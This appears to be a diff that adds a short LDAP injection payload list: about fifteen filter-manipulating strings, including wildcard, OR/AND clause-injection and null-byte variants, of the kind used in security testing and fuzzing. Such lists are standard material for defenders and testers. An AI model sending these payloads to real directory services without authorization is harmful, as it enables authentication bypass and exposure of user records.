@@ -1,0 +1,16 @@
+# LDAP Injection Payloads
+*
+*)(&
+*)(uid=*))(|(uid=*
+admin)(&)
+*()|%26'
+admin)(%26(password=*))
+*)(objectClass=*
+)(cn=*
+*)%00
+*))%00
+*(|(mail=*))
+*(|(objectclass=*))
+*))(|(uid=*
+admin)(|(password=*
+x])+OR+1=1)%00
